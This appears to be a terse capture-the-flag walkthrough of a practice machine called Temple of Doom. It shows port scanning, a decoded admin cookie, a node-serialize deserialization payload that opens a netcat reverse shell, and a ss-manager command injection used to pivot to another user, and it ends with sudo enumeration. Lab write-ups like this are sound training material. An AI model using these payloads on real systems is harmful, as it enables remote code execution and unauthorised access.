root@kali ~/D/C/TEMPLE OF DOOM# nmap -sS -T4 -p- 10.0.0.21

PORT    STATE SERVICE
22/tcp  open  ssh
666/tcp open  doom

Found as a cookie.
eyJ1c2VybmFtZSI6IkFkbWluIiwiY3NyZnRva2VuIjoidTMydDRvM3RiM2dnNDMxZnMzNGdnZGdjaGp3bnphMGw9IiwiRXhwaXJlcz0iOkZyaWRheSwgMTMgT2N0IDIwMTggMDA6MDA6MDAgR01UIn0%3D

Base64 decode:

{"username":"Admin","csrftoken":"u32t4o3tb3gg431fs34ggdgchjwnza0l=","Expires=":Friday, 13 Oct 2018 00:00:00 GMT"}

"csrftoken" and expiration date don't effect.
Removing the expiration date and csrftoken headers we get the response "Hello Admin" from the server.

SyntaxError: Unexpected token F in JSON at position 79
    at JSON.parse (<anonymous>)
    at Object.exports.unserialize (/home/nodeadmin/.web/node_modules/node-serialize/lib/serialize.js:62:16)
    at /home/nodeadmin/.web/server.js:12:29
    at Layer.handle [as handle_request] (/home/nodeadmin/.web/node_modules/express/lib/router/layer.js:95:5)
    at next (/home/nodeadmin/.web/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/home/nodeadmin/.web/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/home/nodeadmin/.web/node_modules/express/lib/router/layer.js:95:5)
    at /home/nodeadmin/.web/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/home/nodeadmin/.web/node_modules/express/lib/router/index.js:335:12)
    at next (/home/nodeadmin/.web/node_modules/express/lib/router/index.js:275:10)

Using this payload that allows to get a reverse shell using JavaScript

{"username":"_$$ND_FUNC$$_function(){return require('child_process').execSync('nc 10.0.0.27 4444 -e /bin/bash',(e,out,err)=>{console.log(out);}); }()"}

we can get a reverse shell.
Need to find an artical!!!!!

python2 -c 'import pty; pty.spawn("/bin/bash")'

root:x:0:0:root:/root:/bin/bash
nodeadmin:x:1001:1001::/home/nodeadmin:/bin/bash
fireman:x:1002:1002::/home/fireman:/bin/bash

No SUID files!!!!

pspy64s doesn't find any files

[nodeadmin@localhost home]$ ps aux | grep fireman
root       833  0.0  0.1 301464  4440 ?        S    11:39   0:00 su fireman -c /usr/local/bin/ss-manager
fireman    836  0.0  0.0  37060  3844 ?        Ss   11:39   0:00 /usr/local/bin/ss-manager

nc -u localhost 8839
add: {“server_port":8003, "password":"test", "method":"||nc -e /bin/sh 10.0.0.27 4445 ||"}

sudo -l

User fireman may run the following commands on localhost:
(ALL) NOPASSWD: /sbin/iptables
(ALL) NOPASSWD: /usr/bin/nmcli
(ALL) NOPASSWD: /usr/bin/tcpdump

After finishing the machine I found some write ups and there are a couple of ways to get root, I'll show all of them.

https://gtfobins.github.io/gtfobins/tcpdump/